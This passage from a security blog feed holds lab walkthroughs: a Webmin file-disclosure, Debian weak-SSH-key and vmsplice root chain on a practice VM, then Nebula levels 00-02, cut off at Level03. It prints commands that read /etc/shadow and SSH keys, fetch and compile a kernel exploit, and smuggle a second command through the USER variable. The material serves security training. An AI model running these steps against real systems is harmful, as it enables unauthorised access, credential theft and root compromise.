<p>There is a file disclosure vulnerability for the Webmin server, available in Metasploit:</p>

<blockquote><p>A vulnerability has been reported in Webmin and Usermin, which can be exploited by malicious people to disclose potentially sensitive
information. The vulnerability is caused due to an unspecified error within the handling of an URL. This can be exploited to read the contents
of any files on the server via a specially crafted URL, without requiring a valid login. The vulnerability has been reported in Webmin
(versions prior to 1.290) and Usermin (versions prior to 1.220).</p></blockquote>

<p>With it, I was able to pull the target&rsquo;s <em>/etc/shadow</em> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/admin/webmin/file_disclosure
</span><span class='line'>msf auxiliary(file_disclosure) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/webmin/file_disclosure):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting   Required  Description
</span><span class='line'>   ----     ---------------   --------  -----------
</span><span class='line'>   DIR      /unauthenticated  yes       Webmin directory path
</span><span class='line'>   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPATH    /etc/passwd       yes       The file to download
</span><span class='line'>   RPORT    10000             yes       The target port
</span><span class='line'>   VHOST                      no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Auxiliary action:
</span><span class='line'>
</span><span class='line'>   Name      Description
</span><span class='line'>   ----      -----------
</span><span class='line'>   Download  
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf auxiliary(file_disclosure) &gt; set RPATH /etc/shadow
</span><span class='line'>RPATH =&gt; /etc/shadow
</span><span class='line'>msf auxiliary(file_disclosure) &gt; run
</span><span class='line'>
</span><span class='line'>[*] [2016.02.24-09:02:11] Attempting to retrieve /etc/shadow...
</span><span class='line'>[*] [2016.02.24-09:02:11] The server returned: 200 Document follows
</span><span class='line'>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
</span><span class='line'>daemon:*:14040:0:99999:7:::
</span><span class='line'>bin:*:14040:0:99999:7:::
</span><span class='line'>sys:*:14040:0:99999:7:::
</span><span class='line'>sync:*:14040:0:99999:7:::
</span><span class='line'>games:*:14040:0:99999:7:::
</span><span class='line'>man:*:14040:0:99999:7:::
</span><span class='line'>lp:*:14040:0:99999:7:::
</span><span class='line'>mail:*:14040:0:99999:7:::
</span><span class='line'>news:*:14040:0:99999:7:::
</span><span class='line'>uucp:*:14040:0:99999:7:::
</span><span class='line'>proxy:*:14040:0:99999:7:::
</span><span class='line'>www-data:*:14040:0:99999:7:::
</span><span class='line'>backup:*:14040:0:99999:7:::
</span><span class='line'>list:*:14040:0:99999:7:::
</span><span class='line'>irc:*:14040:0:99999:7:::
</span><span class='line'>gnats:*:14040:0:99999:7:::
</span><span class='line'>nobody:*:14040:0:99999:7:::
</span><span class='line'>dhcp:!:14040:0:99999:7:::
</span><span class='line'>syslog:!:14040:0:99999:7:::
</span><span class='line'>klog:!:14040:0:99999:7:::
</span><span class='line'>mysql:!:14040:0:99999:7:::
</span><span class='line'>sshd:!:14040:0:99999:7:::
</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>From here you can crack the hashes with our pal, John the Ripper, but I won&rsquo;t go into that, because a Nessus scan revealed a shorter route to hacking the target.</p>

<h3>Exploit</h3>

<p>The host is vulnerable to the Debian OpenSSH/OpenSSL Package Random Number Generator Weakness that allows bruteforcing with precalculated SSH keys. You can read more about it <a href="https://github.com/g0tmi1k/debian-ssh">here</a>, and also download the vulnerable keys. The vulnerability stems from the fact that the random data used by the algorithm is the PID of the process generating the key.</p>

<p>Using the earlier file disclosure module of Metasploit, it&rsquo;s possible to search the contents of the <code>.ssh/authorized_keys</code> file for each user. I didn&rsquo;t find anything for root, but obama has been in the house!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(file_disclosure) &gt; set RPATH /home/obama/.ssh/authorized_keys
</span><span class='line'>RPATH =&gt; /home/obama/.ssh/authorized_keys
</span><span class='line'>msf auxiliary(file_disclosure) &gt; run
</span><span class='line'>
</span><span class='line'>[*] [2016.02.29-05:02:52] Attempting to retrieve /home/obama/.ssh/authorized_keys...
</span><span class='line'>[*] [2016.02.29-05:02:52] The server returned: 200 Document follows
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So we know obama&rsquo;s public key, and we also have the vulnerable pregenerated keys that we downloaded earlier. So it&rsquo;s possible to search for this public key among all those keys:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/debian-ssh/common_keys/rsa/2048#grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ==
</span><span class='line'>dcbe2a56e8cdea6d17495f6648329ee2-4679.pub</span></code></pre></td></tr></table></div></figure>


<p>Great! A match has been found! I used to ssh on the box as obama (wouldn&rsquo;t it be nice to be able to do this on an actual White House computer.. xD)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/debian-ssh/common_keys/rsa/2048#ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.80.150
</span><span class='line'>Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>Last login: Mon Feb 29 04:44:43 2016 from 192.168.80.144
</span><span class='line'>obama@ubuntuvm:~$</span></code></pre></td></tr></table></div></figure>


<h3>Privilege escalation</h3>

<p>The kernel version of the system is outdated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ uname -a
</span><span class='line'>Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Googling it instantly brought some good news about <code>vmsplice_to_pipe()</code>, a local privilge escalation vulnerability that affects kernels prior to 2.6.24.2. And the <a href="https://www.exploit-db.com/exploits/5092/">source</a> is available on ExploitDB. You can see that the author didn&rsquo;t lack any imagination with the name of the source code file (read the first line, it&rsquo;s hilarious) xD</p>

<p>Ok, back to business. I downloaded the file on the compromised box (had to use the <code>&mdash;no-check-certificate</code> option because I would get an error otherwise):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ wget -O vmsplice.c https://www.exploit-db.com/download/5092 --no-check-certificate
</span><span class='line'>--05:27:51--  https://www.exploit-db.com/download/5092
</span><span class='line'>           =&gt; `vmsplice.c'
</span><span class='line'>Resolving www.exploit-db.com... 192.124.249.8
</span><span class='line'>Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
</span><span class='line'>WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
</span><span class='line'>WARNING: certificate common name `*.mycloudproxy.com' doesn't match requested host name `www.exploit-db.com'.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 6,293 (6.1K) [application/txt]
</span><span class='line'>
</span><span class='line'>100%[============================================================================================================================&gt;] 6,293         --.--K/s             
</span><span class='line'>
</span><span class='line'>05:27:52 (1.07 GB/s) - `vmsplice.c' saved [6293/6293]</span></code></pre></td></tr></table></div></figure>


<p>Compiled, and ran the code..and we are root!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ gcc -o vmsplice vmsplice.c
</span><span class='line'>obama@ubuntuvm:~$ ./vmsplice 
</span><span class='line'>-----------------------------------
</span><span class='line'> Linux vmsplice Local Root Exploit
</span><span class='line'> By qaaz
</span><span class='line'>-----------------------------------
</span><span class='line'>[+] mmap: 0x0 .. 0x1000
</span><span class='line'>[+] page: 0x0
</span><span class='line'>[+] page: 0x20
</span><span class='line'>[+] mmap: 0x4000 .. 0x5000
</span><span class='line'>[+] page: 0x4000
</span><span class='line'>[+] page: 0x4020
</span><span class='line'>[+] mmap: 0x1000 .. 0x2000
</span><span class='line'>[+] page: 0x1000
</span><span class='line'>[+] mmap: 0xb7e4b000 .. 0xb7e7d000
</span><span class='line'>[+] root
</span><span class='line'>root@ubuntuvm:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Challenge completed! :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How many IBM types does it take to   \
</span><span class='line'>| change a light bulb? A: Fifteen. One to |
</span><span class='line'>| do it, and fourteen to write document   |
</span><span class='line'>| number                                  |
</span><span class='line'>|                                         |
</span><span class='line'>| GC7500439-0001, Multitasking            |
</span><span class='line'>| Incandescent Source System Facility,    |
</span><span class='line'>|                                         |
</span><span class='line'>| of which 10% of the pages state only    |
</span><span class='line'>| "This page intentionally                |
</span><span class='line'>|                                         |
</span><span class='line'>| left blank", and 20% of the definitions |
</span><span class='line'>| are of the form "A:.....                |
</span><span class='line'>|                                         |
</span><span class='line'>| consists of sequences of non-blank      |
</span><span class='line'>\ characters separated by blanks".        /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula levels 00-10]]></title>
    <link href="http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/"/>
    <updated>2016-01-09T09:50:44-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10</id>
    <content type="html"><![CDATA[<p><a href="https://exploit-exercises.com/">exploit-exercises.com</a> provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.</p>

<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>

<ul>
<li>  SUID files</li>
<li>  Permissions</li>
<li>  Race conditions</li>
<li>  Shell meta-variables</li>
<li>  $PATH weaknesses</li>
<li>  Scripting language weaknesses</li>
<li>  Binary compilation failures</li>
</ul>


<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>

<p>I am doing these levels by SSH&#8217;ing into the box, rather than directly in the Nebula terminal.</p>

<p>Because my posts tend to become gigantic when I am focusing on a single challenge and it takes alot of time between them, I am going to break them up into smaller posts from now on, hence why I will cover only the levels from 00 to 10 in this post.</p>

<!-- more -->


<h3>Level00</h3>

<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>

<p>Alternatively, look at the find man page.</p>

<p>To access this level, log in as level00 with the password of level00.</p>

<p>After logging in, use the <em>find</em> command like this: <code>sudo find / -user flag00 -perm -4000 -print 2> /dev/null</code>. It prints all SUID files of the flag00 user and all error output is thrown in the black hole. So you will find the binary in <code>/rofs/bin/&hellip;/flag00</code>. You could also have looked for it directly, by noticing the rofs folder which doesn&rsquo;t normally exist in a Linux installation. Run the binary and you will see this message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Congrats, now run getflag to get your flag!</span></code></pre></td></tr></table></div></figure>


<p>Run getflag and level complete:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level01</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a SUID program owned by the flag01 user. When run it outputs <em>and now what?</em>. The <em>env</em> program is the one that actually invokes the <em>echo</em> command, and it doesn&rsquo;t use an absolute path. <em>env</em> runs a program in a modified environment and it looks in the  $PATH for the executable it&rsquo;s supposed to run. So we can make an executable of our own, name it <em>echo</em>, and add it to the path, so that it will take precedence over the others.</p>

<p>First, let&rsquo;s see our current path:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ echo $PATH
</span><span class='line'>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m going to add my <em>echo</em> program to the path to be searched before anywhere else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ PATH=/tmp:$PATH
</span><span class='line'>level01@nebula:~$ echo $PATH
</span><span class='line'>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>And now create an <em>echo</em> file in <em>/tmp/</em>, that will run <em>getflag</em> (and make it executable):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/tmp$ cat echo 
</span><span class='line'>/bin/getflag</span></code></pre></td></tr></table></div></figure>


<p>Now go back and run the <em>flag01</em> binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/home/flag01$ ./flag01 
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level02</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this program outputs the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ ./flag02 
</span><span class='line'>about to call system("/bin/echo level02 is cool")
</span><span class='line'>level02 is cool</span></code></pre></td></tr></table></div></figure>


<p>The vulnerability is based on the fact that <em>getenv</em> is called on the USER environment variable. Since this is a SUID program, it&rsquo;s dangerous to trust the contents of the environment. The manpage actually provides a more secure alternative:</p>

<blockquote><p>The secure_getenv() function is intended  for  use  in  general-purpose
libraries  to  avoid vulnerabilities that could occur if set-user-ID or
set-group-ID programs accidentally trusted the environment.</p></blockquote>

<p>And we can exploit this by modifying the USER variable to make the program execute code of our choosing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ export USER='pwned;/bin/getflag;'
</span><span class='line'>level02@nebula:/home/flag02$ echo $USER
</span><span class='line'>pwned;/bin/getflag;
</span><span class='line'>level02@nebula:/home/flag02$ ./flag02 
</span><span class='line'>about to call system("/bin/echo pwned;/bin/getflag; is cool")
</span><span class='line'>pwned
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>sh: is: command not found</span></code></pre></td></tr></table></div></figure>


<p>So why did this work? Remember this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>Normally the USER would be level02, so it would look like this: <code>/bin/echo level02 is cool</code>. But we have control of what is returned by <em>getenv</em>. The injection was <code>pwned;/bin/getflag;</code>. So now it becomes this: <code>/bin/echo pwned;/bin/getflag; is cool</code>. The &ldquo;pwned&rdquo; is there just so that the <em>echo</em> command can print something. Then the <strong>;</strong> terminates the <em>echo</em> command and chains a new one, executing <em>getflag</em>. And the final <strong>;</strong> acts to comment out the rest of the string that was to be displayed (notice that bash treated the string as a command and reported that it couldn&rsquo;t find it).</p>

<h3>Level03</h3>

<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>

<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>

<p>So we have a shell script and a directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
